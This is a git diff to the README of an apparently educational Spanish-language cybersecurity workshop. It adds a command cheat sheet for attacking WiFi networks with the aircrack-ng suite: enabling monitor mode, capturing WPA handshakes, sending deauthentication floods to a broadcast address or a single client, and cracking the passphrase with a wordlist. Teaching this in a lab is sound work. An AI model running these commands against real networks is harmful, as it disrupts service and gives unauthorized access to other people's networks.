@@ -1,5 +1,32 @@
 # udg-taller-ciberseguridad
 
+## Creando diccionarios
+```bash
+```
+
+## Atacando redes wifi
+```bash
+
+sudo airmon-ng start wlp2s0 # monitor
+iwconfig # wifi info
+
+sudo airodump-ng wlp2s0mon ## Scan 2Ghz
+sudo airodump-ng wlp2s0mon --essid=<ssid>  ## Scan 2Ghz and filter by regex 
+sudo airodump-ng wlp2s0mon --essid-regex=<ssid> --band a ### Scan 5Ghz
+
+## Monitor and capture a handshake
+sudo airodump-ng wlp2s0mon -c <channel> --bssid <bssid> -w psk.pcap --output-format pcap 
+
+## Send generic deauth packets, may not work in all scenarios
+sudo aireplay-ng -0 0 -a <bssid> wlp2s0mon # broadcast
+sudo aireplay-ng -0 0 -a <bssid> -c <client-mac> wlp2s0mon # to 1 client
+
+## Cracking
+aircrack-ng -w ./creds.txt --bssid=<bssid> ./psk.pcap-0*
+
+sudo airmon-ng check kill ## stop
+
+```
 
 ## Encontrando dispositivos en la red
 ```bash
